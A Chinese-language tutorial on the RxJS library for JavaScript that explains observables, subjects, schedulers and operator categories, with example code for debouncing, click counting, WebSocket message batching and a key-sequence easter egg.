  - [RxJS 初探](https://www.jianshu.com/p/162b73ebc5ca)

  - [RxJS 英文文档](https://rxjs.dev/guide/overview)

  - [RxJS 中文文档](https://cn.rx.js.org/)

  - [Rxjs入门与初步应用](https://www.jianshu.com/p/ba91eebd1cdb)

2. 详解

  * 基本概念

    Rxjs是Promise 的超集。

    RxJS 是一个库，它通过使用 observable 序列来编写异步和基于事件的程序。它提供了一个核心类型 Observable，附属类型 (Observer、 Schedulers、 Subjects) 和 Array 启发的操作符 (map、filter、reduce、every, 等等)，这些数组操作符可以把异步事件作为集合来处理。

    前端的异步有：事件（event）、ajax、动画（animation）、定时器（timer）、WebSocket、Service Worker、requestAnimationFrame。 
    
    处理这些的时候常见的问题有：
    
    1. 异步的回调地狱（callback hell）

      按照普通的javascript方法写，所有的处理写在某个事件的完成后的回调中，当有多个回调依次执行后1->2->3->4很容易将代码写成火箭形，很大一团根本没发改。

    2. 竞态条件（race condition）

      统出现不恰当的执行时序，而得到不正确的结果。比如搜索框中，每次输入后发送请求获取结果展示在搜索框下面，由于网络或者后端查询的原因有可能导致最后发送的请求比之前的请求更快的完成了，这时最终展现的并不是最后那个请求的结果，而这并不是我们所希望的。

    3. 内存泄漏（memory leak）

      单页面应用切换页面时未在合适的时机移除监听事件造成内存泄漏

    4. 管理复杂状态（manage complex states）

      异步带来了状态的改变，可能会使状态管理变得非常复杂，尤其是某个状态有多个来源时，比如有些应用，一开始有一个默认值，再通过 AJAX 获取初始状态，存储在 localStorage，之后通过 WebSocket 获取更新。这时查询状态可能是同步或者异步的，状态的变更可能是主动获取也可能是被动推送的，如果还有各种排序、筛选，状态管理将会更加复杂。

    5. 错误处理（exception handling）

      javascript中的try catch只能捕获同步的错误，对于异步的错误难以获取。promise中可以使用一个全局的catch。

    6. Promise 有一个缺点

      promise已经解决了很多异步的难点，比如将回调地狱改为了链式调用，统一同步和异步代码，但是promise只有一个结果，并且不可以被提前取消
    
      一旦调用了resolve或者是reject之后便返回了,不能再次使用resolve 或者是reject

  * RxJS对项目代码的影响

    1. 与promise相互转化

      ```js
      const ob = Observable.fromPromise(somePromise); // Promise转为Observable
      const promise = someObservable.toPromise(); // Observable转为Promise
      ```

    2. 体积

      RxJS(v5)整个库压缩后约为140KB，由于其模块化可扩展的设计，因此仅需导入所用到的类与操作符即可。导入RxJS常用类与操作符后，打包后的体积约增加30-60KB，具体取决于导入的数量。

      ```js
      //不要用 import { Observable } from 'rxjs'这种方式导入，这会导入整个rxjs库，按需导入的方式如下：
      import { Observable } from 'rxjs/Observable' //导入类
      import 'rxjs/add/operator/map' // 导入实例操作符
      import 'rxjs/add/observable/forkJoin' // 导入类操作符
      import { Observable, asapScheduler, SubscriptionLike, PartialObserver, Subject, asapScheduler, pipe, of, from, interval, merge, fromEvent, SubscriptionLike, PartialObserver } from 'rxjs';
      import { map, filter, scan, take, takeUtil } from 'rxjs/operators';
      import { webSocket } from 'rxjs/webSocket';
      import { ajax } from 'rxjs/ajax';
      ```

  * RxJS的主要成员

    * Observable (可观察对象): 表示一个概念，这个概念是一个可调用的未来值或事件的集合。
      * of():用于创建简单的Observable，该Observable只发出给定的参数，在发送完这些参数后发出完成通知.
      * from():从一个数组、类数组对象、promise、迭代器对象或者类Observable对象创建一个Observable.
      * fromEvent(),:把event转换成Observable.
      * range():在指定起始值返回指定数量数字.
      * interval():基于给定时间间隔发出数字序列。返回一个发出无限自增的序列整数，可以选择固定的时间间隔进行发送。
      * timer():创建一个Observable，该Observable在初始延时之后开始发送并且在每个时间周期后发出自增的数字
    * Observer (观察者): 一个回调函数的集合，它知道如何去监听由 Observable 提供的值。
    * Subscription (订阅): 表示 Observable 的执行，主要用于取消 Observable 的执行。
    * Operators (操作符): 采用函数式编程风格的纯函数 (pure function)，使用像 map、filter、concat、flatMap 等这样的操作符来处理集合。
      * 把多个数据流以首位相连的方式合并	concat 和 concatAll
      * 把多个数据流中数据以先到先得方式合并	merge 和 mergeAll
      * 把多个数据流中的数据以一一对应的方式合并	zip 和 zipAll
      * 持续合并多个数据流中最新产生的数据	combineLatest、combineAll 和 withLatestFrom
      * 从多个数据流中选取第一个产生内容的数据流	race
      * 在数据流前面添加一个指定数据	startWith
      * 只获取多个数据流最后产生的那个数据	forkJoin
      * 从高阶数据流中切换数据源	switch 和 exhaust
      * 统计数据流中产生的所有数据个数	count
      * 获得数据流中最大或最小的数据	max 和 min
      * 对数据流中所有数据进行规约操作	reduce
      * 判断是否所有数据满足某个判定条件	every
      * 找到第一个满足判定条件的数据	find 和 findIndex
      * 判断一个数据流是否不包含任何数据	isEmpty
      * 如果一个数据流为空就默认产生一个指定数据	defaultEmpty
      * 功能需求	使用的操作符
      * 过滤掉不满足判定条件的数据	filter
      * 获得满足判定条件的第一个数据	first
      * 获得满足判定条件的最后一个数据	last
      * 从数据流中选取最先出现的若干数据	take
      * 从数据流中选取最后出现的若干数据	takeLast
      * 从数据流中选取数据直到某种情况发生	takeWhile 和 takeUntil
      * 从数据流中忽略最先出现的若干数据	skip
      * 从数据流中忽略数据直到某种情况发生	skipWhile 和 skipUntil
      * 基于时间的数据流量筛选	throttleTime、debounceTime 和 auditTime
      * 基于数据内容的数据流量筛选	throttle、debounce 和 audit
      * 基于采样方式的数据流量筛选	sample 和 sampleTime
      * 删除重复的数据	distinct
      * 删除重复的连续数据	distinctUntil 和 distinctUntilKeyChange
      * 忽略数据流中的所有数据	ignoreElement
      * 只选取指定出现位置的数据	elementAt
      * 判断是否只有一个数据满足判定条件	single
      * 将每个元素用映射函数产生新的数据	map
      * 将数据流中每个元素映射为同一数据	mapTo
      * 提取数据流中每个数据的某个字段	pluck
      * 产生高阶 Observable 对象	windowTime、windowCount、windowToggle 和window
      * 产生数组构成的数据流	bufferTime、BufferCount、bufferWhen、bufferToggle 和 buffer
      * 映射产生高阶 Observable 对象然后合并	concatMap、mergeMap（flatMap）、switchMap、exhaustMap
      * 产生规约运算结果组成的数据流	scan 和 mergeScan
    * Subject (主体): 相当于 EventEmitter，并且是将值或事件多路推送给多个 Observer 的唯一方式。
    * Schedulers (调度器): 用来控制并发并且是中央集权的调度员，允许我们在发生计算时进行协调，例如 setTimeout 或 requestAnimationFrame 或其他。
      * queue	Sync同步的方式	scheduler.schedule(task, delay) scheduler.flush()
      * asap	Async(异步微任务)	Promise.resolve().then(() => task)
      * async	Async(异步宏任务)	id = setInterval(task, delay) clearInterval(id)
      * animationFrame	Async	id = requestAnimationFrame(task) cancelAnimationFrame(id)

  * 使用样例

    1. Observable

    ```js
    const Observable1 = new Observable(subscriber => {
        try {
            subscriber.next(1);
            subscriber.next(2);
            subscriber.next(3);
            setTimeout(() => {
                subscriber.next(4);
                subscriber.complete();
            }, 1000);
        } catch (err) {
            subscriber.error(err);	//传递一个错误对象，如果捕捉到异常的话。
        }
    });
    const Observable2 = from([
        { name: 'Dave', age: 34, salary: 2000 },
        { name: 'Nick', age: 37, salary: 32000 },
        { name: 'Howie', age: 40, salary: 26000 },
        { name: 'Brian', age: 40, salary: 30000 },
        { name: 'Kevin', age: 47, salary: 24000 },
    ]);
    const Observable3 = of("Dave", "Nick");//把所有参数组合到数组,逐个提供给消费者
    const Observable4 = range(1, 10);
    const Observable5 = interval(3000);//从零开始每3000毫秒自增并提供给消费者
    const Observable6 = timer(3000, 1000);//等待3000毫秒后,从零开始每1000毫秒自增并提供给消费者

    Observable1.subscribe({
        next: num => {
            console.log(num);
        },
        error: err => console.log(err),
        complete: () => console.log("Streaming is over.")
    });// 1 2 3 (1s) 4 Streaming is over.
    Observable2.subscribe({
        next: num => {
            console.log(num);
        },
        error: err => console.log(err),
        complete: () => console.log("Streaming is over.")
    });
    // { name: 'Dave', age: 34, salary: 2000 },
    // { name: 'Nick', age: 37, salary: 32000 }
    // { name: 'Howie', age: 40, salary: 26000 }
    // { name: 'Brian', age: 40, salary: 30000 }
    // { name: 'Kevin', age: 47, salary: 24000 }
    // Streaming is over.
    Observable3.subscribe({
        next: num => {
            console.log(num);
        },
        error: err => console.log(err),
        complete: () => console.log("Streaming is over.")
    });
    // Dave
    // Nick
    // Streaming is over.
    Observable4.subscribe({
        next: num => {
            console.log(num);
        },
        error: err => console.log(err),
        complete: () => console.log("Streaming is over.")
    });
    // 1 2 3 4 5 6 7 8 9 10 Streaming is over.
    Observable5.subscribe({
        next: num => {
            console.log(num);
        },
        error: err => console.log(err),
        complete: () => console.log("Streaming is over.")
    });
    // 0 (3s) 1 (3s) 2 (3s) 3 (3s) 4...
    Observable6.subscribe({
        next: num => {
            console.log(num);
        },
        error: err => console.log(err),
        complete: () => console.log("Streaming is over.")
    });
    // (3s) 0 (1s) 1 (1s) 2 (1s) 3 (1s) 4...
    ```

    2. Subject

    ```js
    let subject1 = new Subject();
    subject1.subscribe({
        next: (v) => console.log('observerA: ' + v)
    });
    subject1.subscribe({
        next: (v) => console.log('observerB: ' + v)
    });
    subject1.next(1);
    subject1.next(2);
    // observerA: 1
    // observerB: 1
    // observerA: 2
    // observerB: 2

    let subject2 = new Subject();
    subject2.subscribe({
        next: (v) => console.log('observerC: ' + v)
    });
    subject2.subscribe({
        next: (v) => console.log('observerD: ' + v)
    });
    let observable = from(['a', 'b', 'c']);
    observable.subscribe(subject2);
    // observerC: a
    // observerD: a
    // observerC: b
    // observerD: b
    // observerC: c
    // observerD: c
    ```

    multicasted
    ```js
    const source = timer(1000, 2500).pipe(take(5));
    const subject = new Subject();
    subject.subscribe({
        next: (v) => console.log('observerA: ' + v)
    });
    subject.subscribe({
        next: (v) => console.log('observerB: ' + v)
    });
    const multicasted = source.pipe(share({ connector: () => new Subject() }));
    multicasted.subscribe({
        next: (v) => console.log('observerC: ' + v)
    });
    multicasted.subscribe({
        next: (v) => console.log('observerD: ' + v)
    });
    source.subscribe(subject);
    // observerC: 0
    // observerD: 0
    // observerA: 0
    // observerB: 0
    // observerC: 1
    // observerD: 1
    // observerA: 1
    // observerB: 1
    // ...
    // observerC: 4
    // observerD: 4
    // observerA: 4
    // observerB: 4
    ```

    pipe+operator
    ```js
    const ob = interval(1000).pipe(take(3)).pipe(map(n => n * 2)).pipe(filter(n => n > 0));
    ob.subscribe(n => console.log(n));
    // 2 4
    ```

    其它
    ```txt
    创建操作符:
    ajax/bindCallback/bindNodeCallback/defer/empty/from/fromEvent/fromEventPattern/generate/interval/of/range/throwError/timer/iif
    连接创建操作符:
    combineLatest/concat/forkJoin/merge/partition/race/zip
    转换操作符:
    buffer/bufferCount/bufferTime/bufferToggle/bufferWhen/concatMap/concatMapTo/exhaust/exhaustMap/expand/groupBy/map/mapTo/mergeMap/mergeMapTo/mergeScan/pairwise/partition/pluck/scan/switchMap/switchMapTo/window/windowCount/windowTime/windowToggle/windowWhen
    过滤操作符:
    audit/auditTime/debounce/debounceTime/distinct/distinctKey/distinctUntilChanged/distinctUntilKeyChanged/elementAt/filter/first/ignoreElements/last/sample/sampleTime/single/skip/skipLast/skipUntil/skipWhile/take/takeLast/takeUntil/takeWhile/throttle/throttleTime
    组合操作符:
    combineAll/concatAll/exhaust/mergeAll/startWith/withLatestFrom
    多播操作符:
    multicast/publish/publishBehavior/publishLast/publishReplay/share
    错误处理操作符:
    catchError/retry/retryWhen
    工具操作符:
    tap/delay/delayWhen/dematerialize/materialize/observeOn/subscribeOn/timeInterval/timestamp/timeout/timeoutWith/toArray
    条件和布尔操作符:
    defaultIfEmpty/every/find/findIndex/isEmpty
    数学和聚合操作符:
    count/max/min/reduce
    ```

  * 代码优化对比

    基于 websocket 的在线聊天室，不可能每次 ws 收到新消息，都立刻渲染出来，这样在很多人同时说话的时候，一般会有渲染性能问题。

    需要收集一段时间的消息，然后把它们一起渲染出来，例如每一秒批量渲染一次。

    原生 JS 伪代码
    ```js
    let messagePool = []
    ws.on('message', (message) => {
        messagePool.push(message)
    })

    setInterval(() => {
        render(messagePool)
        messagePool = []
    }, 1000)
    ```

    rxjs 伪代码
    ```js
    Rx.Observable
        .fromEvent(ws, 'message')
        .bufferTime(1000)
        .subscribe(messages => render(messages))
    ```

  * 实际场景

    测试鼠标按住时间
    ```js
    const buttonDom = document.getElementById('button');
    const mouseDown$ = fromEvent(buttonDom, 'mousedown');
    const mouseUp$ = fromEvent(buttonDom, 'mouseup');
    const holdTime$ = mouseUp$.pipe(timestamp()).pipe(withLatestFrom(mouseDown$.pipe(timestamp()), (mouseUpEvent, mouseDownEvent) => {
        return mouseUpEvent.timestamp - mouseDownEvent.timestamp;
    }));
    holdTime$.subscribe((ms) => {
        document.getElementById('holdTime').innerText = ms;
    });
    ```

    统计5秒内用户点击数
    ```js
    const click$ = fromEvent(document, 'click');
    click$.pipe(bufferWhen(() => interval(5000))).subscribe(arr => console.log(arr.length))
    ```

    防抖和节流
    ```js
    let foo$ = fromEvent(document, 'click');
    foo$.pipe(debounceTime(2000)).subscribe({
        next: () => console.log('click'),
        error: null,
        complete: () => console.log('complete')
    });
    ```
    ```js
    let foo$ = fromEvent(document, 'click');
    foo$.pipe(throttleTime(2000)).subscribe({
        next: () => console.log('click'),
        error: null,
        complete: () => console.log('complete')
    });
    ```

    转化
    ```js
    // scan 和 reduce 的区别
    // reduce需要数据结束才能输出结果
    // scan可以输出中间状态
    let foo$ = interval(1000);
    // acc 为上次返回值
    // cur 更新的值，此处由foo$提供
    foo$.pipe(scan((acc, cur) => {
        return cur * 2
    }, 0)).subscribe((data) => console.log(data));
    ```

    判断连续输入是否正确
    ```js
    import _ from 'lodash'

    const code = [
        "ArrowUp",
        "ArrowUp",
        "ArrowDown",
        "ArrowDown",
        "ArrowLeft",
        "ArrowRight",
        "ArrowLeft",
        "ArrowRight",
        "KeyB",
        "KeyA",
        "KeyB",
        "KeyA"
    ]

    fromEvent(document, 'keyup')
        .pipe(map(e => e.code))
        .pipe(bufferCount(12, 1))
        .subscribe(last12key => {
            console.log(last12key);
            if (_.isEqual(last12key, code)) {//lodash
                console.log('隐藏的彩蛋 \(^o^)/~')
            }
        });
    ```